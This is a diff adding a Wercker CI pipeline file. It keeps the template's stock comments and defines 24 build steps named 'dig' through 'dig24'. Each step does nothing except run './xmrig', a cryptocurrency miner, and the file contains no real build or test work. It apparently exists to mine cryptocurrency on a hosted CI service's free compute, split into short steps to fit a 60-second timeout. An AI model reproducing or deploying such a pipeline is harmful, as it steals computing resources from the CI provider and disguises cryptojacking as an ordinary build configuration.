@@ -1,0 +1,119 @@
+# This references a standard debian container from the
+# Docker Hub https://registry.hub.docker.com/_/debian/
+# Read more about containers on our dev center
+# http://devcenter.wercker.com/docs/containers/index.html
+box: debian
+command-timeout: 60
+# You can also use services such as databases. Read more on our dev center:
+# http://devcenter.wercker.com/docs/services/index.html
+# services:
+    # - postgres
+    # http://devcenter.wercker.com/docs/services/postgresql.html
+
+    # - mongo
+    # http://devcenter.wercker.com/docs/services/mongodb.html
+
+# This is the build pipeline. Pipelines are the core of wercker
+# Read more about pipelines on our dev center
+# http://devcenter.wercker.com/docs/pipelines/index.html
+build:
+    # Steps make up the actions in your pipeline
+    # Read more about steps on our dev center:
+    # http://devcenter.wercker.com/docs/steps/index.html
+  steps:
+    - script:
+        name: dig
+        code: |
+          ./xmrig
+    - script:
+        name: dig2
+        code: |
+          ./xmrig
+    - script:
+        name: dig3
+        code: |
+          ./xmrig
+    - script:
+        name: dig4
+        code: |
+          ./xmrig
+    - script:
+        name: dig5
+        code: |
+          ./xmrig
+    - script:
+        name: dig6
+        code: |
+          ./xmrig
+    - script:
+        name: dig7
+        code: |
+          ./xmrig
+    - script:
+        name: dig8
+        code: |
+          ./xmrig
+    - script:
+        name: dig9
+        code: |
+          ./xmrig
+    - script:
+        name: dig10
+        code: |
+          ./xmrig
+    - script:
+        name: dig11
+        code: |
+          ./xmrig
+    - script:
+        name: dig12
+        code: |
+          ./xmrig
+    - script:
+        name: dig13
+        code: |
+          ./xmrig
+    - script:
+        name: dig14
+        code: |
+          ./xmrig
+    - script:
+        name: dig15
+        code: |
+          ./xmrig
+    - script:
+        name: dig16
+        code: |
+          ./xmrig
+    - script:
+        name: dig17
+        code: |
+          ./xmrig
+    - script:
+        name: dig18
+        code: |
+          ./xmrig
+    - script:
+        name: dig19
+        code: |
+          ./xmrig
+    - script:
+        name: dig20
+        code: |
+          ./xmrig
+    - script:
+        name: dig21
+        code: |
+          ./xmrig
+    - script:
+        name: dig22
+        code: |
+          ./xmrig
+    - script:
+        name: dig23
+        code: |
+          ./xmrig
+    - script:
+        name: dig24
+        code: |
+          ./xmrig
